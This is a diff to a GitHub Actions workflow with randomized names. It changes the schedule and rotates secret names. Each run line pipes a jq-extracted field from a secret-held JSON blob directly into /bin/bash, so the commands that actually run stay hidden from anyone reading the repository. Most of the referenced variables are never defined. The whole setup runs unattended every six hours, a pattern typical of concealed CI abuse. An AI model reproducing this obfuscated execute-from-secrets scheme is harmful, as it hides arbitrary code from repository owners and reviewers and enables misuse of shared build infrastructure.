@@ -3,32 +3,25 @@ name: luxuejiao1988
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
+    - cron: '13 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luxuejiao1988
         env:
-          cwyga8: ${{ secrets.cwyga8 }}
+          jdss7954: ${{ secrets.jdss7954 }}
         run: |
-          echo $cwyga8 | jq -r .euz64741 | /bin/bash
-          echo $xpd07 | jq -r .wxvr6848 | /bin/bash
-          echo $pj71527 | jq -r .b1 | /bin/bash
-          echo $qkiyp3 | jq -r .p67 | /bin/bash
-          echo $w4 | jq -r .jgfzx451 | /bin/bash
-          echo $yy613 | jq -r .d10 | /bin/bash
-          echo $rvujp04960 | jq -r .dcig78 | /bin/bash
-          echo $vfch48 | jq -r .f5 | /bin/bash
-          echo $eotq7 | jq -r .kg5 | /bin/bash
-          echo $ixr74 | jq -r .zxfm105 | /bin/bash
-          echo $xv7261 | jq -r .chtf2004 | /bin/bash
-          echo $fc1 | jq -r .n2 | /bin/bash
-          echo $zqhks6462 | jq -r .qn94 | /bin/bash
-          echo $b632 | jq -r .t9 | /bin/bash
-          echo $uhmx65 | jq -r .as6 | /bin/bash
-          echo $zue973 | jq -r .yp65 | /bin/bash
-          echo $fxtin885 | jq -r .uelor1 | /bin/bash
-          echo $js761 | jq -r .nb48 | /bin/bash
+          echo $jdss7954 | jq -r .wts6838 | /bin/bash
+          echo $xh6448 | jq -r .yqaz089 | /bin/bash
+          echo $ixv8 | jq -r .sbqo4470 | /bin/bash
+          echo $hos3 | jq -r .uzbi21 | /bin/bash
+          echo $ue403 | jq -r .rf172 | /bin/bash
+          echo $s1953 | jq -r .ng85596 | /bin/bash
+          echo $qxdqi8078 | jq -r .gz24 | /bin/bash
+          echo $e74 | jq -r .ffn87 | /bin/bash
+          echo $plxfq786 | jq -r .w5 | /bin/bash
 
